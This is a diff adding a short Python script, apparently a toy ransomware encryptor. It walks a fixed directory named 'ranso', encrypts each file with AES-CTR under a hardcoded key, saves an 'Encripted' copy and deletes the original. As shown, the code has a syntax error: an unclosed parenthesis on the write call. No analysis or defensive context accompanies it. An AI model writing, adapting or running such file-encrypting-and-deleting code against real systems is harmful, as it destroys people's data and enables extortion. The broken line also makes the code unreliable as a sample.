@@ -1,0 +1,28 @@
+# coding=utf-8
+import os
+import pyaes
+
+
+directory = '/home/diretorio/ranso/'                 
+list = os.listdir(directory)                    
+
+for files in os.listdir(directory):             
+  os.chdir(directory)                            
+  with open(files, 'rb') as c:                 
+    data = c.read()                             
+    c.close()                                    
+    
+
+  key = b"0123456789abcdef"                      
+  aes = pyaes.AESModeOfOperationCTR(key)        
+  crypto_data = aes.encrypt(data)               
+
+
+  new_file = 'Encripted'+os.path.basename(files)
+  
+  # Save Files
+  file_out = open(new_file, 'wb')               
+  file_out.write(crypto_data                     
+  file_out.close()                               
+
+  os.remove(files)                               
